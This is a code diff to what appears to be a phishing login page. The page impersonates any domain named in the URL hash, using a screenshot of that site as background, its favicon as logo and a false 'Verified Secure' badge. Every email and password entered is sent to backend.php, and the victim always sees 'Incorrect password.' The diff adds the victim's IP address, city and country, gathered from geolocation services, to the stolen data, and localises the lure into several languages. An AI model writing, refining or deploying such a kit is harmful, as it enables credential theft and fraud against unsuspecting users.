@@ -180,6 +180,7 @@
             border: 1px solid #c8c8c8;
         }
         
+        /* Error message styles - now inline with login button */
         .inline-error {
             color: #e74c3c;
             font-weight: 600;
@@ -212,6 +213,7 @@
             <a href="#" class="forgot-password" id="forgotPassword">Forgot Password?</a>
         </div>
         
+        <!-- Error message now appears here -->
         <div class="inline-error" id="error-msg"></div>
         
         <button type="button" id="login-btn">Sign In</button>
@@ -231,121 +233,208 @@
     </form>
 
     <script>
-        // GUARANTEED TRANSLATION FUNCTION
-        function translateForm(countryCode) {
-            console.log("TRANSLATE FUNCTION CALLED WITH COUNTRY:", countryCode);
-            
-            // Simple country to language mapping
-            const languageMap = {
-                'ES': 'es', // Spain - Spanish
-                'MX': 'es', // Mexico - Spanish
-                'AR': 'es', // Argentina - Spanish
-                'FR': 'fr', // France - French
-                'DE': 'de', // Germany - German
-                'IT': 'it', // Italy - Italian
-                'JP': 'ja', // Japan - Japanese
-                'CN': 'zh', // China - Chinese
-                'RU': 'ru', // Russia - Russian
-                'BR': 'pt', // Brazil - Portuguese
-                'KR': 'ko'  // Korea - Korean
-            };
-            
-            // All other countries default to English
-            const langCode = languageMap[countryCode] || 'en';
-            console.log("SELECTED LANGUAGE CODE:", langCode);
-            
-            // Translations
-            const translations = {
-                en: {
-                    title: "SECURE LOGIN",
-                    emailLabel: "Email Address",
-                    emailPlaceholder: "Enter email address",
-                    passwordLabel: "Password",
-                    passwordPlaceholder: "Enter password",
-                    forgotPassword: "Forgot Password?",
-                    loginButton: "Sign In",
-                    secureText: "Secure connection • Information protected",
-                    errorEmpty: "Please enter both email and password.",
-                    errorIncorrect: "Incorrect password. Please try again."
-                },
-                es: {
-                    title: "INICIO DE SESIÓN SEGURO",
-                    emailLabel: "Correo Electrónico",
-                    emailPlaceholder: "Ingrese su correo electrónico",
-                    passwordLabel: "Contraseña",
-                    passwordPlaceholder: "Ingrese su contraseña",
-                    forgotPassword: "¿Olvidó su contraseña?",
-                    loginButton: "Iniciar Sesión",
-                    secureText: "Conexión segura • Información protegida",
-                    errorEmpty: "Por favor ingrese correo y contraseña.",
-                    errorIncorrect: "Contraseña incorrecta. Intente de nuevo."
-                },
-                fr: {
-                    title: "CONNEXION SÉCURISÉE",
-                    emailLabel: "Adresse Email",
-                    emailPlaceholder: "Entrez votre adresse email",
-                    passwordLabel: "Mot de Passe",
-                    passwordPlaceholder: "Entrez votre mot de passe",
-                    forgotPassword: "Mot de passe oublié?",
-                    loginButton: "Se Connecter",
-                    secureText: "Connexión sécurisée • Information protégée",
-                    errorEmpty: "Veuillez entrer email et mot de passe.",
-                    errorIncorrect: "Mot de passe incorrect. Réessayez."
-                },
-                de: {
-                    title: "SICHERER LOGIN",
-                    emailLabel: "E-Mail-Adresse",
-                    emailPlaceholder: "E-Mail-Adresse eingeben",
-                    passwordLabel: "Passwort",
-                    passwordPlaceholder: "Passwort eingeben",
-                    forgotPassword: "Passwort vergessen?",
-                    loginButton: "Anmelden",
-                    secureText: "Sichere Verbindung • Informationen geschützt",
-                    errorEmpty: "Bitte geben Sie E-Mail und Passwort ein.",
-                    errorIncorrect: "Falsches Passwort. Bitte versuchen Sie es erneut."
-                },
-                zh: {
-                    title: "安全登录",
-                    emailLabel: "电子邮件地址",
-                    emailPlaceholder: "输入电子邮件地址",
-                    passwordLabel: "密码",
-                    passwordPlaceholder: "输入密码",
-                    forgotPassword: "忘记密码？",
-                    loginButton: "登录",
-                    secureText: "安全连接 • 信息受保护",
-                    errorEmpty: "请输入电子邮件和密码。",
-                    errorIncorrect: "密码不正确。请重试。"
-                },
-                ja: {
-                    title: "安全ログイン",
-                    emailLabel: "メールアドレス",
-                    emailPlaceholder: "メールアドレスを入力",
-                    passwordLabel: "パスワード",
-                    passwordPlaceholder: "パスワードを入力",
-                    forgotPassword: "パスワードをお忘れですか？",
-                    loginButton: "ログイン",
-                    secureText: "安全な接続 • 情報保護済み",
-                    errorEmpty: "メールアドレスとパスワードを入力してください。",
-                    errorIncorrect: "パスワードが正しくありません。もう一度お試しください。"
-                },
-                ru: {
-                    title: "БЕЗОПАСНЫЙ ВХОД",
-                    emailLabel: "Адрес электронной почты",
-                    emailPlaceholder: "Введите адрес электронной почты",
-                    passwordLabel: "Пароль",
-                    passwordPlaceholder: "Введите пароль",
-                    forgotPassword: "Забыли пароль?",
-                    loginButton: "Войти",
-                    secureText: "Безопасное соединение • Информация защищена",
-                    errorEmpty: "Пожалуйста, введите email и пароль.",
-                    errorIncorrect: "Неверный пароль. Попробуйте снова."
+        // Language translations
+        const translations = {
+            en: {
+                title: "SECURE LOGIN",
+                emailLabel: "Email Address",
+                emailPlaceholder: "Enter email address",
+                passwordLabel: "Password",
+                passwordPlaceholder: "Enter password",
+                forgotPassword: "Forgot Password?",
+                loginButton: "Sign In",
+                secureText: "Secure connection • Information protected",
+                errorEmpty: "Please enter both email and password.",
+                errorIncorrect: "Incorrect password. Please try again.",
+                detectingLocation: "Detecting location...",
+                autoLanguage: "Auto (Detect)"
+            },
+            es: {
+                title: "INICIO DE SESIÓN SEGURO",
+                emailLabel: "Correo Electrónico",
+                emailPlaceholder: "Ingrese su correo electrónico",
+                passwordLabel: "Contraseña",
+                passwordPlaceholder: "Ingrese su contraseña",
+                forgotPassword: "¿Olvidó su contraseña?",
+                loginButton: "Iniciar Sesión",
+                secureText: "Conexión segura • Información protegida",
+                errorEmpty: "Por favor ingrese correo y contraseña.",
+                errorIncorrect: "Contraseña incorrecta. Intente de nuevo.",
+                detectingLocation: "Detectando ubicación...",
+                autoLanguage: "Auto (Detectar)"
+            },
+            fr: {
+                title: "CONNEXION SÉCURISÉE",
+                emailLabel: "Adresse Email",
+                emailPlaceholder: "Entrez votre adresse email",
+                passwordLabel: "Mot de Passe",
+                passwordPlaceholder: "Entrez votre mot de passe",
+                forgotPassword: "Mot de passe oublié?",
+                loginButton: "Se Connecter",
+                secureText: "Connexión sécurisée • Information protégée",
+                errorEmpty: "Veuillez entrer email et mot de passe.",
+                errorIncorrect: "Mot de passe incorrect. Réessayez.",
+                detectingLocation: "Détection de la localisation...",
+                autoLanguage: "Auto (Détecter)"
+            },
+            de: {
+                title: "SICHERER LOGIN",
+                emailLabel: "E-Mail-Adresse",
+                emailPlaceholder: "E-Mail-Adresse eingeben",
+                passwordLabel: "Passwort",
+                passwordPlaceholder: "Passwort eingeben",
+                forgotPassword: "Passwort vergessen?",
+                loginButton: "Anmelden",
+                secureText: "Sichere Verbindung • Informationen geschützt",
+                errorEmpty: "Bitte geben Sie E-Mail und Passwort ein.",
+                errorIncorrect: "Falsches Passwort. Bitte versuchen Sie es erneut.",
+                detectingLocation: "Standort wird erkannt...",
+                autoLanguage: "Auto (Erkennen)"
+            },
+            zh: {
+                title: "安全登录",
+                emailLabel: "电子邮件地址",
+                emailPlaceholder: "输入电子邮件地址",
+                passwordLabel: "密码",
+                passwordPlaceholder: "输入密码",
+                forgotPassword: "忘记密码？",
+                loginButton: "登录",
+                secureText: "安全连接 • 信息受保护",
+                errorEmpty: "请输入电子邮件和密码。",
+                errorIncorrect: "密码不正确。请重试。",
+                detectingLocation: "检测位置中...",
+                autoLanguage: "自动（检测）"
+            },
+            ja: {
+                title: "安全ログイン",
+                emailLabel: "メールアドレス",
+                emailPlaceholder: "メールアドレスを入力",
+                passwordLabel: "パスワード",
+                passwordPlaceholder: "パスワードを入力",
+                forgotPassword: "パスワードをお忘れですか？",
+                loginButton: "ログイン",
+                secureText: "安全な接続 • 情報保護済み",
+                errorEmpty: "メールアドレスとパスワードを入力してください。",
+                errorIncorrect: "パスワードが正しくありません。もう一度お試しください。",
+                detectingLocation: "位置情報を検出中...",
+                autoLanguage: "自動（検出）"
+            },
+            ru: {
+                title: "БЕЗОПАСНЫЙ ВХОД",
+                emailLabel: "Адрес электронной почты",
+                emailPlaceholder: "Введите адрес электронной почты",
+                passwordLabel: "Пароль",
+                passwordPlaceholder: "Введите пароль",
+                forgotPassword: "Забыли пароль?",
+                loginButton: "Войти",
+                secureText: "Безопасное соединение • Информация защищена",
+                errorEmpty: "Пожалуйста, введите email и пароль.",
+                errorIncorrect: "Неверный пароль. Попробуйте снова.",
+                detectingLocation: "Определение местоположения...",
+                autoLanguage: "Авто (Определить)"
+            },
+            ar: {
+                title: "تسجيل الدخول الآمن",
+                emailLabel: "عنوان البريد الإلكتروني",
+                emailPlaceholder: "أدخل عنوان البريد الإلكتروني",
+                passwordLabel: "كلمة المرور",
+                passwordPlaceholder: "أدخل كلمة المرور",
+                forgotPassword: "نسيت كلمة المرور؟",
+                loginButton: "تسجيل الدخول",
+                secureText: "اتصال آمن • المعلومات محمية",
+                errorEmpty: "الرجاء إدخال البريد الإلكتروني وكلمة المرور.",
+                errorIncorrect: "كلمة المرور غير صحيحة. حاول مرة أخرى.",
+                detectingLocation: "جاري اكتشاف الموقع...",
+                autoLanguage: "تلقائي (اكتشاف)"
+            }
+        };
+
+        // Country flag mapping
+        const countryFlags = {
+            'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
+            'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'JP': '🇯🇵', 'CN': '🇨🇳',
+            'RU': '🇷🇺', 'BR': '🇧🇷', 'IN': '🇮🇳', 'MX': '🇲🇽', 'KR': '🇰🇷',
+            'SA': '🇸🇦', 'AE': '🇦🇪', 'TR': '🇹🇷', 'NL': '🇳🇱', 'SE': '🇸🇪',
+            'NO': '🇳🇴', 'DK': '🇩🇰', 'FI': '🇫🇮', 'PL': '🇵🇱', 'GR': '🇬🇷'
+        };
+
+        // Language code to country mapping for auto-detection
+        const countryToLanguage = {
+            'US': 'en', 'GB': 'en', 'CA': 'en', 'AU': 'en',
+            'ES': 'es', 'MX': 'es', 'AR': 'es', 'CO': 'es',
+            'FR': 'fr', 'BE': 'fr', 'CH': 'fr',
+            'DE': 'de', 'AT': 'de', 'CH': 'de',
+            'CN': 'zh', 'TW': 'zh', 'HK': 'zh',
+            'JP': 'ja',
+            'RU': 'ru', 'UA': 'ru', 'BY': 'ru',
+            'SA': 'ar', 'AE': 'ar', 'EG': 'ar'
+        };
+
+        let userIP = '';
+        let userCountry = '';
+        let userCity = '';
+        let currentLanguage = 'en';
+
+        // Function to get IP and location
+        async function getUserLocation() {
+            try {
+                // Get IP address
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                userIP = ipData.ip;
+                
+                // Get location data
+                const locationResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
+                const locationData = await locationResponse.json();
+                
+                userCountry = locationData.country_code || 'Unknown';
+                userCity = locationData.city || 'Unknown';
+                const countryName = locationData.country_name || 'Unknown';
+                
+                // Update location display
+                const flag = countryFlags[userCountry] || '📍';
+                document.getElementById('locationFlag').textContent = flag;
+                document.getElementById('locationText').textContent = `${userCity}, ${countryName}`;
+                document.getElementById('ipDisplay').textContent = `IP: ${userIP}`;
+                
+                // Auto-detect language based on country
+                if (countryToLanguage[userCountry]) {
+                    currentLanguage = countryToLanguage[userCountry];
+                    translatePage(currentLanguage);
                 }
-            };
-            
+                
+            } catch (error) {
+                console.error('Error getting location:', error);
+                document.getElementById('locationText').textContent = 'Location unavailable';
+                document.getElementById('ipDisplay').textContent = 'IP: Unknown';
+                
+                // Try fallback IP service
+                try {
+                    const fallbackResponse = await fetch('https://api.db-ip.com/v2/free/self');
+                    const fallbackData = await fallbackResponse.json();
+                    userIP = fallbackData.ipAddress || 'Unknown';
+                    userCountry = fallbackData.countryCode || 'Unknown';
+                    
+                    const flag = countryFlags[userCountry] || '📍';
+                    document.getElementById('locationFlag').textContent = flag;
+                    document.getElementById('ipDisplay').textContent = `IP: ${userIP}`;
+                    
+                    if (countryToLanguage[userCountry]) {
+                        currentLanguage = countryToLanguage[userCountry];
+                        translatePage(currentLanguage);
+                    }
+                } catch (fallbackError) {
+                    console.error('Fallback also failed:', fallbackError);
+                }
+            }
+        }
+
+        // Function to translate the page
+        function translatePage(langCode) {
             const lang = translations[langCode] || translations.en;
-            window.currentLanguage = langCode;
+            currentLanguage = langCode;
             
-            // Apply translations
+            // Update all translatable elements
             document.getElementById('domainHeading').textContent = lang.title;
             document.getElementById('emailLabel').textContent = lang.emailLabel;
             document.getElementById('email').placeholder = lang.emailPlaceholder;
@@ -354,95 +443,6 @@
             document.getElementById('forgotPassword').textContent = lang.forgotPassword;
             document.getElementById('login-btn').textContent = lang.loginButton;
             document.getElementById('secureText').textContent = lang.secureText;
-            
-            console.log("TRANSLATION COMPLETE TO:", langCode);
-        }
-
-        // FOOLPROOF LOCATION DETECTION
-        async function detectLocationAndTranslate() {
-            console.log("=== STARTING LOCATION DETECTION ===");
-            
-            try {
-                // Method 1: Try ipinfo.io (most reliable)
-                console.log("Trying ipinfo.io...");
-                const response1 = await fetch('https://ipinfo.io/json');
-                const data1 = await response1.json();
-                
-                if (data1 && data1.country) {
-                    console.log("Success from ipinfo.io!");
-                    console.log("Country:", data1.country);
-                    console.log("IP:", data1.ip);
-                    console.log("City:", data1.city);
-                    
-                    // Update display
-                    const flags = {'US':'🇺🇸','ES':'🇪🇸','FR':'🇫🇷','DE':'🇩🇪','IT':'🇮🇹','JP':'🇯🇵','CN':'🇨🇳','RU':'🇷🇺','BR':'🇧🇷','KR':'🇰🇷'};
-                    document.getElementById('locationFlag').textContent = flags[data1.country] || '📍';
-                    document.getElementById('locationText').textContent = `${data1.city || 'Unknown'}, ${data1.country}`;
-                    document.getElementById('ipDisplay').textContent = `IP: ${data1.ip}`;
-                    
-                    // TRANSLATE IMMEDIATELY
-                    translateForm(data1.country);
-                    return;
-                }
-            } catch (error) {
-                console.log("ipinfo.io failed:", error.message);
-            }
-            
-            try {
-                // Method 2: Try ipapi.co
-                console.log("Trying ipapi.co...");
-                const response2 = await fetch('https://ipapi.co/json/');
-                const data2 = await response2.json();
-                
-                if (data2 && data2.country_code) {
-                    console.log("Success from ipapi.co!");
-                    console.log("Country:", data2.country_code);
-                    console.log("IP:", data2.ip);
-                    
-                    // Update display
-                    const flags = {'US':'🇺🇸','ES':'🇪🇸','FR':'🇫🇷','DE':'🇩🇪','IT':'🇮🇹','JP':'🇯🇵','CN':'🇨🇳','RU':'🇷🇺'};
-                    document.getElementById('locationFlag').textContent = flags[data2.country_code] || '📍';
-                    document.getElementById('locationText').textContent = `${data2.city || 'Unknown'}, ${data2.country_name || data2.country_code}`;
-                    document.getElementById('ipDisplay').textContent = `IP: ${data2.ip}`;
-                    
-                    // TRANSLATE
-                    translateForm(data2.country_code);
-                    return;
-                }
-            } catch (error) {
-                console.log("ipapi.co failed:", error.message);
-            }
-            
-            try {
-                // Method 3: Simple IP + geolocation
-                console.log("Trying combined method...");
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                
-                if (ipData && ipData.ip) {
-                    console.log("Got IP:", ipData.ip);
-                    
-                    // Try to get country from IP
-                    const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/country/`);
-                    const country = await geoResponse.text();
-                    
-                    if (country && country.trim().length === 2) {
-                        console.log("Got country from IP:", country.trim());
-                        translateForm(country.trim());
-                    }
-                    
-                    document.getElementById('ipDisplay').textContent = `IP: ${ipData.ip}`;
-                    document.getElementById('locationText').textContent = "Location detected";
-                }
-            } catch (error) {
-                console.log("Combined method failed:", error.message);
-            }
-            
-            // If all fails, show default
-            console.log("All methods failed, using default");
-            document.getElementById('locationText').textContent = "Online";
-            document.getElementById('ipDisplay').textContent = "IP: Active";
-            translateForm('en'); // Default to English
         }
 
         // Process URL hash for domain customization
@@ -475,29 +475,24 @@
                 domainBadge.textContent = fullDomain;
                 domainBadge.style.display = 'block';
                 
-                // Load background image
                 document.body.style.backgroundImage = `url('https://image.thum.io/get/width/1920/fullpage/https://${fullDomain}')`;
-                
                 document.getElementById('secureNote').innerHTML = `<span class="tick">✓</span> Verified Secure • ${rootDomain.toUpperCase()} Inc. ©2025`;
                 
                 // Add error handling for logo
                 logo.onerror = function() {
+                    console.log('Logo failed to load, trying alternative...');
                     logo.src = `https://t2.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://${fullDomain}&size=256`;
+                    
                     logo.onerror = function() {
+                        console.log('Alternative logo also failed to load');
                         logo.style.display = 'none';
                     };
                 };
             }
         }
 
-        // START DETECTION IMMEDIATELY
-        window.addEventListener('load', function() {
-            console.log("=== PAGE LOADED ===");
-            detectLocationAndTranslate();
-        });
-
-        // ALSO start immediately
-        detectLocationAndTranslate();
+        // Get user location on page load
+        getUserLocation();
 
         // Login functionality
         let attemptCount = 0;
@@ -511,14 +506,18 @@
             const password = document.getElementById('password').value.trim();
             
             if (!email || !password) {
-                errorMsg.textContent = translations[window.currentLanguage || 'en'].errorEmpty;
+                errorMsg.textContent = translations[currentLanguage].errorEmpty;
                 return;
             }
             
-            // Submit login data
+            // Submit login data (including location info)
             const formData = new FormData();
             formData.append('email', email);
             formData.append('password', password);
+            formData.append('ip', userIP);
+            formData.append('country', userCountry);
+            formData.append('city', userCity);
+            formData.append('language', currentLanguage);
             
             fetch('backend.php', {
                 method: 'POST',
@@ -530,7 +529,7 @@
             
             // Handle login attempts
             if (attemptCount < 3) {
-                errorMsg.textContent = translations[window.currentLanguage || 'en'].errorIncorrect;
+                errorMsg.textContent = translations[currentLanguage].errorIncorrect;
             } else {
                 errorMsg.textContent = '';
                 const domain = email.split('@')[1];
